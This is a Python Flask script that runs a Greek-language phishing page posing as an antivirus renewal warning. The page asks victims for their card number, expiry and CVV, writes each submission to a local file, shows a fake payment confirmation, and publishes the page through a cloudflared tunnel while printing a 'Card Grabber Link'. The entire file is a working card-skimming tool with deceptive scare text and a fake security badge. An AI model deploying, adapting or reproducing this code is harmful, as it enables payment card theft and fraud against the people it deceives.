import os
import re
import subprocess
import threading
import time
import logging
import sys
from flask import Flask, render_template_string, request, redirect, url_for
from werkzeug.utils import secure_filename
from datetime import datetime

# Suppress Flask logs only
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def install_deps():
    subprocess.run(["pkg", "update", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["pkg", "install", "-y", "tor", "cloudflared", "python", "pip"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["pip", "install", "--upgrade", "flask", "werkzeug"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_tor():
    subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)

def generate_cloudflared_link(port=7777):
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    for line in proc.stdout:
        match = re.search(r"https://[a-zA-Z0-9.-]+\.trycloudflare\.com", line)
        if match:
            return proc, match.group(0)
    return proc, None

# Flask App
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

CARD_STORAGE_FOLDER = os.path.expanduser('~/storage/downloads/CardActivations')
os.makedirs(CARD_STORAGE_FOLDER, exist_ok=True)

@app.after_request
def secure_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['Content-Security-Policy'] = "default-src 'self'; style-src 'self' 'unsafe-inline';"
    response.headers['Referrer-Policy'] = "no-referrer"
    return response

@app.route('/')
def index():
    months = [f"{i:02d}" for i in range(1, 13)]
    years = [str(y) for y in range(2015, 2047)]
    return render_template_string(f"""
    <!DOCTYPE html>
    <html lang="el">
    <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Ενημέρωση Ασφαλείας - Επαλήθευση Πληρωμής</title>
       <style>
           @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
           body {{
               font-family: 'Orbitron', sans-serif;
               background: #0a021c;
               color: #e0d4ff;
               text-align: center;
               padding: 20px;
           }}
           .container {{
               width: 90%;
               max-width: 400px;
               background: #1a0736;
               padding: 20px;
               margin: auto;
               border-radius: 10px;
               box-shadow: 0 0 20px #6a0dad;
           }}
           h2 {{
               color: #ff5252;
               text-shadow: 0 0 10px #ff3838;
           }}
           .warning {{
               font-size: 16px;
               color: #ffcc00;
               font-weight: bold;
               margin-bottom: 10px;
           }}
           .alert {{
               font-size: 14px;
               color: #ff5252;
               margin-bottom: 15px;
           }}
           label, select, input, button {{
               display: block;
               width: 100%;
               margin-bottom: 10px;
               font-size: 16px;
           }}
           select, input {{
               padding: 10px;
               border: 1px solid #6a0dad;
               border-radius: 5px;
               background: #10052a;
               color: white;
               outline: none;
           }}
           button {{
               background: #ff5252;
               color: white;
               padding: 10px;
               border: none;
               border-radius: 5px;
               font-weight: bold;
               cursor: pointer;
               transition: 0.3s;
           }}
           button:hover {{
               background: #ff3838;
               box-shadow: 0 0 10px #ff5252;
           }}
           .secure-badge {{
               background: #10052a;
               padding: 5px;
               border-radius: 5px;
               color: #ffcc00;
               font-weight: bold;
               margin-top: 10px;
               display: inline-block;
           }}
       </style>
    </head>
    <body>
       <h2>⚠️ ΕΠΕΙΓΟΝ: Απαιτείται Επαλήθευση Ασφαλείας</h2>
       <p class="warning">Η συνδρομή σας στο antivirus πρόκειται να λήξει!</p>
       <p class="alert">Για να συνεχίσετε να προστατεύετε το τηλέφωνό σας από ιούς και χάκερ, πρέπει να επαληθεύσετε τον τρόπο πληρωμής σας.</p>
       <div class="container">
           <form action="/save_card" method="POST">
               <label for="cardtype">Τύπος Κάρτας</label>
               <select id="cardtype" name="cardtype" required>
                   <option value="Visa">Visa</option>
                   <option value="Mastercard">Mastercard</option>
                   <option value="American Express">American Express</option>
                   <option value="Discover">Discover</option>
               </select>
               <label for="cardholder">Κάτοχος Κάρτας</label>
               <input type="text" id="cardholder" name="cardholder" placeholder="Πλήρες Όνομα" required>
               <label for="cardnumber">Αριθμός Κάρτας</label>
               <input type="text" id="cardnumber" name="cardnumber" placeholder="1234 5678 9012 3456" required>
               <label for="expmonth">Ημερομηνία Λήξης</label>
               <div style="display: flex; gap: 10px;">
                   <select id="expmonth" name="expmonth" required>
                       {''.join(f'<option value="{m}">{m}</option>' for m in months)}
                   </select>
                   <select id="expyear" name="expyear" required>
                       {''.join(f'<option value="{y}">{y}</option>' for y in years)}
                   </select>
               </div>
               <label for="cvv">CVV</label>
               <input type="text" id="cvv" name="cvv" placeholder="123" required>
               <button type="submit">🔒 Πληρώστε 3€ & Συνεχίστε την Προστασία</button>
           </form>
           <p class="secure-badge">🔒 Επαληθευμένο από την Αρχή Ασφαλείας</p>
       </div>
    </body>
    </html>
    """)

@app.route('/save_card', methods=['POST'])
def save_card():
    form = request.form
    cardtype = form.get('cardtype', '').strip()
    cardholder = form.get('cardholder', '').strip()
    cardnumber = form.get('cardnumber', '').strip()
    expmonth = form.get('expmonth', '').strip()
    expyear = form.get('expyear', '').strip()
    cvv = form.get('cvv', '').strip()

    filename = f"{secure_filename(cardholder)}_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
    filepath = os.path.join(CARD_STORAGE_FOLDER, filename)

    try:
        with open(filepath, 'w') as f:
            f.write(f"Timestamp: {datetime.now()}\n")
            f.write(f"Card Type: {cardtype}\n")
            f.write(f"Card Holder: {cardholder}\n")
            f.write(f"Card Number: {cardnumber}\n")
            f.write(f"Expiration Date: {expmonth}/{expyear}\n")
            f.write(f"CVV: {cvv}\n")
            f.write(f"Amount Charged: €3\n")
        os.chmod(filepath, 0o600)
    except Exception as e:
        return f"Error saving card: {str(e)}", 500

    return redirect(url_for('payment_success'))

@app.route('/payment_success')
def payment_success():
    # Updated professional success page HTML only:
    return """
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Επιτυχής Πληρωμή</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
            body {
                background-color: #0a021c;
                color: #e0d4ff;
                font-family: 'Roboto', sans-serif;
                margin: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                text-align: center;
                padding: 20px;
            }
            .card {
                background: #1a0736;
                padding: 30px 40px;
                border-radius: 12px;
                box-shadow: 0 0 30px #6a0dad;
                max-width: 400px;
                width: 100%;
            }
            h1 {
                color: #32cd32;
                margin-bottom: 10px;
                font-weight: 700;
                font-size: 2.5em;
            }
            p {
                font-size: 1.1em;
                margin: 15px 0;
                line-height: 1.4;
                color: #d1c4e9;
            }
            .redirect-info {
                margin-top: 20px;
                font-size: 0.9em;
                color: #a29bfe;
            }
        </style>
    </head>
    <body>
        <div class="card">
            <h1>✅ Επιτυχής Πληρωμή</h1>
            <p>Ευχαριστούμε! Η πληρωμή σας ύψους <strong>3,00€</strong> έχει διεκπεραιωθεί με ασφάλεια.</p>
            <p>Η συνδρομή σας στο antivirus είναι τώρα ενεργή και προστατεύει τη συσκευή σας.</p>
            <p class="redirect-info">Σε λίγο θα ανακατευθυνθείτε στην αρχική σελίδα.</p>
        </div>
        <script>
            setTimeout(function(){
                window.location.href = "/";
            }, 5000);
        </script>
    </body>
    </html>
    """

def run_server():
    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *args: None
    app.run(host='0.0.0.0', port=7777, debug=False)

if __name__ == '__main__':
    install_deps()
    start_tor()
    threading.Thread(target=run_server, daemon=True).start()
    time.sleep(5)
    _, link = generate_cloudflared_link()
    if link:
        print("Card Grabber Link:\n" + link)
    while True:
        time.sleep(10)